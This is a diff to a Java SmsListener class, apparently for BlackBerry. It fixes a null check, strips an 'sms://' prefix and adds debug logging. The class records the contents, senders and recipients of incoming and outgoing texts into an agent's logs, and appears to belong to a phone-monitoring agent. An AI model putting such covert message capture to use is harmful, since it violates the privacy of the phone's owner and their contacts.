@@ -50,7 +50,9 @@ public class SmsListener {
 
     public final void stop() {
         try {
-            smsconn.close();
+            if(smsconn!=null){
+                smsconn.close();
+            }
         } catch (IOException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
@@ -105,13 +107,19 @@ public class SmsListener {
 
             String from;
             String to;
+            String address = message.getAddress();
+           
+            final String prefix = "sms://";
+            if(address.indexOf(prefix) == 0){
+                address = address.substring(prefix.length());
+            }
 
             if (incoming) {
-                from = message.getAddress();
+                from = address;
                 to = getMyAddress();
             } else {
                 from = getMyAddress();
-                to = message.getAddress();
+                to = address;
             }
 
             final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
@@ -122,6 +130,11 @@ public class SmsListener {
             databuffer.write(Utils.padByteArray(from, 16));
             databuffer.write(Utils.padByteArray(to, 16));
 
+            //#debug info
+            debug.info("Received sms : " + (incoming?"incoming":"outgoing"));
+            //#debug info
+            debug.info("From: " +from + " To: "+ to +" date: "+filetime);
+                        
             //Check.ensures(additionalData.length == 56, "Wrong buffer size");
 
             messageAgent.createLog(additionalData, WChar.getBytes(msg), LogType.SMS_NEW);
@@ -142,7 +155,7 @@ public class SmsListener {
 
     private String getMyAddress() {
         String number = Phone.getDevicePhoneNumber(false);
-        if (number == null) {
+        if (number == null || number.startsWith("Unknown")) {
             return "local";
         }
 
